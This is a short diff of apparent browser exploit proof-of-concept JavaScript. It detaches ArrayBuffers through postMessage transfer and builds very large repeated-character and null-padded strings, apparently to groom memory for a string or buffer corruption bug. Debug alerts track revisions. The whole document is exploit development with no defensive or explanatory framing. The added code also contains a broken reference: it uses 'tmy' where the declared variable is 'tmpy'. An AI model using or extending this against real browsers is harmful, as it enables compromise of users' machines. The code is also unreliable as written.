@@ -1,6 +1,6 @@
 
 <script>
-alert("start3");
+alert("start4");
 function neuter(ab) {
     postMessage("", "*", [ab]);
 }
@@ -22,12 +22,17 @@ function createStringWithRepeatedChar(c, multiplicity) {
     return c;
 }
 var x = "1";
-var y = "\u8000\u0000";
+var y = "\u0000";
+var tmpy="";
+for(var i=0;i<0x50;i++){
+    tmpy+="\u0000";
+}
 var array=new Array(0x100);
 var mystr=createStringWithRepeatedChar("M",(1 << 16) );
 y = createStringWithRepeatedChar(y,(1 << 16) );
 x = createStringWithRepeatedChar(x, 1 << 16);
 x+="1";
+y=tmy+y.substring(0,y.length-0x50);
 x.substring(0,5);
 mystr.substring(0,5);
 y.substring(0,5);
